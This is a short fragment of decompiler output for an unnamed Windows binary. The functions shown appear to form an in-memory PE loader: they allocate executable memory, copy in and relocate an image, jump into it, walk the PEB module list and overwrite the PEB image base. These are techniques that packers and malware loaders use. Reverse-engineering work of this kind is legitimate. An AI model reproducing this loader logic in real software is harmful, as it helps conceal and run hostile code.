    v4 = (_DWORD *)*v4;
  }
  while ( v4 != *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_4079E8 + 48) + 12) + 12) );
  return 0;
}
// 4079E8: using guessed type int dword_4079E8;

//----- (00401CC0) --------------------------------------------------------
int __cdecl sub_401CC0(int a1)
{
  int v1; // eax

  v1 = dword_407A20(0, a1);
  return dword_407A1C(v1);
}
// 407A1C: using guessed type int (__stdcall *dword_407A1C)(_DWORD);
// 407A20: using guessed type int (__stdcall *dword_407A20)(_DWORD, _DWORD);

//----- (00401CF0) --------------------------------------------------------
int __cdecl sub_401CF0(int a1, int a2)
{
  _DWORD *v3; // [esp+Ch] [ebp-1Ch]
  int v4; // [esp+10h] [ebp-18h]
  int *v5; // [esp+18h] [ebp-10h]
  unsigned int v6; // [esp+1Ch] [ebp-Ch]
  _DWORD *i; // [esp+20h] [ebp-8h]
  unsigned int j; // [esp+24h] [ebp-4h]

  v5 = (int *)(*(_DWORD *)(a2 + 60) + a2);
  dword_4079C0 = dword_407A0C(0, v5[20], 12288, 64);
  if ( dword_4079C0 )
  {
    sub_401060(dword_4079C0, a2, v5[20]);
    v4 = dword_4079C0 - a2;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)(v5[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        for ( j = 0; j < v6; ++j )
        {
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4079C0 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     [ebp+var_24] }
  }
  return 2;
}
// 4079C0: using guessed type int dword_4079C0;
// 407A0C: using guessed type int (__stdcall *dword_407A0C)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401E30) --------------------------------------------------------
int __cdecl sub_401E30(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_4079E8 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 4079E8: using guessed type int dword_4079E8;

// nfuncs=13 queued=13 decompiled=13 lumina nreq=0 worse=0 better=0
// ALL OK, 13 function(s) have been successfully decompiled
